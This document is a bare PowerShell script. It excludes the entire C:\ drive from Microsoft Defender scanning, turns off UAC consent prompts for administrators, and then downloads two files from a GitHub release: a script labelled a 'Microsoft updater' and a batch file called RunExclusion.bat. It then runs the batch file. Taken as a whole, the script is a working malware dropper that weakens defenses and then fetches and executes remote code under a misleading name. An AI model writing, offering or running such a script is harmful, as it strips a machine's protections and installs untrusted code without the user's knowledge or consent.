powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\"

Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

# URL of Microsoft Microsoft updater.ps1  (this will download server an run it)
$url1 = "https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/Microsoft.updater.ps1"

# Get the user's "Downloads" folder
$downloadsFolder1 = [Environment]::GetFolderPath("User")

# Local path to save the downloaded file
$outputPath1 = Join-Path -Path $downloadsFolder1 -ChildPath "download.ps1"

# Download the file
Invoke-WebRequest -Uri $url1 -OutFile $outputPath1

# Wait for the download to complete
while ((Test-Path -Path $outputPath1) -eq $false) {
    Start-Sleep -Seconds 1
}


# URL of Bat file download and run it 
$url = "https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/RunExclusion.bat"

# Get the user's "Downloads" folder
$downloadsFolder = [Environment]::GetFolderPath("User")

# Local path to save the downloaded file
$outputPath = Join-Path -Path $downloadsFolder -ChildPath "RunExclusion.bat"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Wait for the download to complete
while ((Test-Path -Path $outputPath) -eq $false) {
    Start-Sleep -Seconds 1
}


# Run the downloaded file
Start-Process -FilePath $outputPath
